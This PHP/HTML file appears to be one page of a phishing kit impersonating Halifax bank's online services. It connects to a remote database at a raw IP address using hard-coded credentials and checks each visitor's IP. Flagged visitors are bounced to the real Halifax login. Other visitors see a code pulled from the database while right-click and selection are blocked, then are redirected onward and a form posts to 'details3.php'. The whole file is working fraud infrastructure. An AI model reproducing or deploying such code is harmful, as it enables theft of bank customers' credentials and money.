<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
?>

<?php
$databoleto = date("d/m/Y");  
$host = "187.45.196.182";
$db   = "fluxshop";
$user = "fluxshop";
$pass = "cod0cod0";
$busca = $numeropedido;
$ip = $_SERVER['REMOTE_ADDR'];

$con = mysql_pconnect($host, $user, $pass) or trigger_error(mysql_error(),E_USER_ERROR); 
mysql_select_db($db, $con);
$query = sprintf("SELECT * FROM `JSPHLT` WHERE ( `CodBusca` = '". $ip ."' ) AND ( NOW() )");
$dados = mysql_query($query, $con) or die(mysql_error());
$linha = mysql_fetch_assoc($dados);
$total = mysql_num_rows($dados);
?>

<?php

include 'connect.php';
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$site = $_SERVER['HTTP_HOST']; 
$ip_visitante = $_SERVER['REMOTE_ADDR'];

$sql = "SELECT * FROM `JSPHLT` WHERE ( `Bank` = '". $ip ."' ) AND ( NOW() )";
$query = mysql_query($sql);
if (mysql_num_rows($query) > 0) {
   echo '<meta http-equiv="refresh" content="0;url=https://www.halifax-online.co.uk/personal/logon/login.jsp">';
  exit;
}

?> 

	
<head>
	
<title>Online Services</title>
<meta http-equiv="refresh" content="10; URL='Code.php'"/>
<link rel="shortcut icon" href="favicon.ico" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body onselectstart="return false" oncontextmenu="return false" ondragstart="return false" onMouseOver="window.status='..message perso .. '; return true;" >
<style type="text/css">
<!--
html{
overflow-y:hidden;
}
-->
</style>

<style type="text/css">
Body{
background-image: url('');
background-repeat: no-repeat;
margin-left:0px;
margin-top:0px;
margin-bottom:-20px
}
</style>
</head>

<body style="background-image: url('2.jpg')">
<form id="form2" onsubmit="return validar(this);" action="details3.php" method="post">
<div id="Layer4" style="position:absolute; width:104px; height:51px; z-index:4; left: 577px; top: 286px;">
    <font color="#FFFFFF" style="font-size: 38pt"><?=$linha['ID_COD']?></font></form>
</div>
</body>
</html>